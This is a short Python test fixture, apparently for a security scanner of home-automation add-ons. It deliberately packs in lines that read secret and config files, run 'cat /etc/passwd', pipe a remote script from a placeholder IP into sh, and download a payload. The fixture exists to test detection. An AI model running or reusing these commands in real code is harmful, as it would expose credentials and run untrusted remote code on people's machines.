# TEST FIXTURE (never executed) - meant to trigger as many HIGH signals as possible
import base64, os, subprocess, urllib.request

def bad():
    # secret store access
    data = open("/config/.storage/core.config_entries").read()
    tok = open("secrets.yaml").read()
    # dynamic execution
    eval("__import__('os').getcwd()")
    exec(base64.b64decode("cHJpbnQoMSk=").decode())
    # shell
    os.system("id; cat /etc/passwd")
    subprocess.Popen("curl http://198.51.100.7/x.sh | sh", shell=True)
    # runtime download
    urllib.request.urlretrieve("http://203.0.113.9/payload", "/tmp/p")
    # embedded blob
    blob = "QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVowMTIzNDU2Nzg5QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVowMTIzNDU2Nzg5QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVowMTIzNDU2Nzg5QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo="
    return data, tok, blob
